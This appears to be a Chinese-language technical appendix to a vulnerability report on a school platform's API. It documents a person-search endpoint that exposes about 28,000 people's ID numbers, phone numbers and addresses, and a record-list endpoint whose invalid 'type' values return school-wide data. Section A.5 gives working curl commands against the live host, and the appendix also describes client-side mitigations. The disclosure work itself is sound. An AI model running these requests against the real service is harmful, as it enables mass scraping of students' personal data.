# 附件 A · 两处接口的调用参数与实测数据摘要

**编号** RISK-2026-1006-01 附件 A
**日期** 2026-10-06

本附件供技术复核使用。**全部数据为条数量级与字段名称，不含任何真实个人信息样本。**

---

## A.1 通用调用约定

两个接口位于同一网关：

```
BASE = https://service.591iq.cn
```

请求头：

```
AccessToken: <学生账号登录后取得的凭据>
clientos: pc
Content-Type: application/x-www-form-urlencoded
```

参数封装为单个 `request` 表单字段，形如 `request={"data":{…}}`。

---

## A.2 问题一 · 人员检索

```
GET /search/search
```

**请求**

```
?request={"data":{"type":"2","content":"<单字>","pageRowBounds":{"offset":0,"limit":10}}}
```

**响应结构**

```
{"totalResult": <命中总数>, "data": null, "list": [ …人员对象… ]}
```

**实测**

| 步骤 | 结果 |
|---|---|
| `content` = 单个汉字 | `totalResult` = 2324 |
| 多个常用汉字分别检索、按 `userId` 去重合并 | 全校人员规模（约 2.8 万人量级） |
| 分页 | 正常生效，可逐页取全量 |

**人员对象字段（约 51 个）**

分为三类：

1. **身份标识类**：`identityCard`、`idNumber`、`identityCardType`、`birthday`、`nationality`、`unifiedExaminationNumber`（考号）、`studentCode`、`individuationUname`
2. **联系方式与住址类**：`phoneNumber`、`qq`、`letter`（家庭住址）、`enrollmentPicUrl`
3. **其他**：`politicalStatus`（政治面貌）、`cadres`（班级干部）、`seatNum`、`headImg` / `userHeadImage`、`gradeName`、`className`、`status`、`schId` 等

> 说明：字段数为在记录详情接口的人员对象上实测所得（51 个）；人员检索接口的返回对象字段集与之高度一致。

---

## A.3 问题二 · 记录列表的范围参数

```
POST /record/queryRecordList
```

**请求体**

```
request={"data":{"type":"<任意值>","recordType":"","labelId":"","offset":0,"limit":10}}
```

**响应结构**

```
{"code": 0, "msg": "操作成功", "data": {"list": {"count": <总数>, "list": [ …记录行… ]}}}
```

**实测矩阵**

| `type` | 前端入口 | `count` |
|---|---|---:|
| `1` | 我的 | 18 |
| `2` | 班级 | 281 |
| `3` | 学校 | 146,020 |
| `4` | 年段 | 12,139 |
| `""` | 无 | 146,020 |
| `0` | 无 | 146,020 |
| `5` | 无 | 146,020 |
| `9` | 无 | 146,020 |
| `abc` | 无 | 146,020 |

**要点**

1. 非法取值**不返回参数错误**，`code` 仍为 `0`；
2. 兜底分支与「学校」范围（`type=3`）返回量级**相同**，均为 146,020 条；
3. 兜底分支包含历年毕业届记录；
4. 每行的 `recordContent.userInf` 含作者 `userId` / `userName` / `className` / `schId`；
5. 每行的 `recordContent.id` 为 32 位十六进制，可用于调取详情；
6. `offset` 分页正常，无频率限制、无单次返回上限。

---

## A.4 前端定义（作为「合法取值」的依据）

学生端界面对 `type` 的定义共 4 项，取自前端组件：

```
[{"id":"2","name":"班级"}, {"id":"4","name":"年段"}, {"id":"3","name":"学校"}, {"id":"1","name":"我的"}]
```

默认值为 `"2"`（班级）。**除这 4 个之外，取值集合中不存在任何其他界面入口。**

---

## A.5 复现所需的最小步骤

```bash
# 1. 以学生账号正常登录，取得凭据（略）

# 2. 问题一：人员检索
curl "https://service.591iq.cn/search/search?request={\"data\":{\"type\":\"2\",\"content\":\"X\",\"pageRowBounds\":{\"offset\":0,\"limit\":10}}}" \
     -H "AccessToken: <凭据>" -H "clientos: pc"

# 3. 问题二：非法 type
curl "https://service.591iq.cn/record/queryRecordList" \
     -H "AccessToken: <凭据>" -H "clientos: pc" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data-urlencode 'request={"data":{"type":"","recordType":"","labelId":"","offset":0,"limit":10}}'
```

> 上述命令中的 `<凭据>` 为占位符。**本附件不含任何真实凭据。**

---

## A.6 我方工具侧的拦截实现（供对照）

**范围白名单**

```
仅放行 type ∈ { "1", "2", "3", "4" }
其余取值 → 直接拒绝，不发出请求
需显式绕开时必须传参，且每次绕开记录 WARNING 日志
```

**详情归属校验**

```
调取记录详情后，比对返回的 userInf.userId 与当前登录者
不一致 → 拒绝
需读他人记录时必须显式传参，且记录 WARNING 日志
```

**身份字段默认收敛**

```
人员/作者对象默认只返回 10 个最小必要字段
```

⚠️ 上述均为**客户端**措施，绕过工具直接发送请求不受限制。